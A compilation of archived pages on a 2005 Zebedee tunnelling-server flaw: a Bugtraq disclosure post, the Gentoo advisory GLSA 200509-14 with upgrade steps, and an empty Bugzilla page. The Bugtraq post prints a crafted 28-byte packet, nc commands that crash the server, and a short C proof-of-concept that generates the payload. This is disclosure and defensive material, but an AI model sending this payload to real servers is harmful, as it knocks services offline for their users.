=== Content from marc.info_44e734cd_20250124_214927.html ===

```
[[prev in list](?l=bugtraq&m=112621175516539&w=2)] [[next in list](?l=bugtraq&m=112629266906880&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Zebedee DoS Vulnerability
From:       ["Shiraishi.M" <shiraishi () insi ! co ! jp>](?a=112629556200005&r=1&w=2)
Date:       [2005-09-09 5:21:36](?l=bugtraq&r=1&w=2&b=200509)
Message-ID: [LMEKLIBMBJJDHMHLFLLOAEKNCDAA.shiraishi () insi ! co ! jp](?i=LMEKLIBMBJJDHMHLFLLOAEKNCDAA.shiraishi%20()%20insi%20!%20co%20!%20jp)
[Download RAW [message](?l=bugtraq&m=112629543605488&q=mbox) or [body](?l=bugtraq&m=112629543605488&q=raw)]

We have found a denial of service vulnerability in Zebedee.
This issue have been fixed in 2.4.1A.

[TESTED ON]

Zebedee 2.4.1 (Windows version and source compiled Linux version)

[VULNERABILITY]

The server crushes when "0" received as the port number in the
protocol option header.

$ od -tx1z -Ax zebedeeDoS
000000 02 01 00 00 20 00 00 06 00 00 00 80 ff ff ff ff  >.... ...........<
000010 0b d8 30 b3 21 9c a6 74 00 00 00 00              >..0.!..t....<
00001c

The 9th and 10th byte of the header contains 0x00.

$ nc -vv -z -w2 zebedeehost 11965
zebedeehost [192.168.xxx.xxx] 11965 (?) open
 sent 0, rcvd 0

$ nc -vv zebedeehost 11965 < zebedeeDoS
zebedeehost [192.168.xxx.xxx] 11965 (?) open
 sent 28, rcvd 2

$ nc -vv -z -w2 zebedeehost 11965
zebedeehost [192.168.xxx.xxx] 11965 (?) : Connection refused
 sent 0, rcvd 0

$

In the zebedee.c, please look at the function makeConnection() wich called
from server(),

   1703     /* Sanity check */
   1704
   1705     assert(host != NULL && port != 0);
   1706

Here, if the port number is "0", both sub and parent processes seemed to
quit running.

This issue occurs when the "allowed redirection port" not set(in default).

[SOLUTION]

1) Upgrading zebedee to 2.4.1A.
Or
2) Setting up allowed redirection ports will address this issue.

[SAMPLE EXPLOIT]

mkZebedeeDoS.c

/*
	$ gcc -o mkZebedeeDoS mkZebedeeDoS.c
	$ ./mkZebedeeDoS > zebedeeDoS
	$ nc targethost port < zebedeeDoS
*/

#include <stdio.h>

int main (int argc, char **argv)
{

	int i, size;

	char data[] = {
	0x02, 0x01, // protocol version
	0x00, 0x00, // flags
	0x20, 0x00, // max message size
	0x00, 0x06, // compression info
	0x00, 0x00, // port request: value = 0x0
	0x00, 0x80, // key length
	0xff, 0xff, 0xff, 0xff, // key token
	0x0b, 0xd8, 0x30, 0xb3, 0x21, 0x9c, 0xa6, 0x74, // nonce value
	0x00, 0x00, 0x00, 0x00 // target host address
	 };

	size = 28;
	for(i=0; i<size; i++){
		printf("%c", data[i]);
	}

	return 0;

}

[DISCOVERED BY]

International Network Security, Inc.
	Mitsuaki Shiraishi
	Tomoki Sanaki
	Mutallip Ablimit

-----------------
International Network Security, Inc.
Shiraishi.M
<shiraishi@insi.co.jp>

[[prev in list](?l=bugtraq&m=112621175516539&w=2)] [[next in list](?l=bugtraq&m=112629266906880&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.gentoo.org_6e66f397_20250124_214928.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Zebedee: Denial of Service vulnerability — GLSA **200509-14**

A bug in Zebedee allows a remote attacker to perform a Denial of Service
attack.

### Affected packages

| Package | **net-misc/zebedee** on all architectures |
| --- | --- |
| Affected versions | < **2.5.3** |
| Unaffected versions | revision >= **2.4.1-r1**>= **2.5.3** |

### Background

Zebedee is an application that establishes an encrypted, compressed
tunnel for TCP/IP or UDP data transfer between two systems.

### Description

"Shiraishi.M" reported that Zebedee crashes when "0" is received as the
port number in the protocol option header.

### Impact

By performing malformed requests a remote attacker could cause Zebedee
to crash.

### Workaround

There is no known workaround at this time.

### Resolution

All Zebedee users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose net-misc/zebedee
```
### References

* [BugTraq ID 14796](http://www.securityfocus.com/bid/14796)
* [CVE-2005-2904](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2904)

**Release date**

September 20, 2005

**Latest revision**

May 22, 2006: 02

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [105115](https://bugs.gentoo.org/show_bug.cgi?id=105115)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from bugs.gentoo.org_fa758ddd_20250126_034513.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Search by bug number

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

You may find a single bug by entering its bug id here:

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=&GoAheadAndLogIn=1#forgot)
    Login:

    [x]


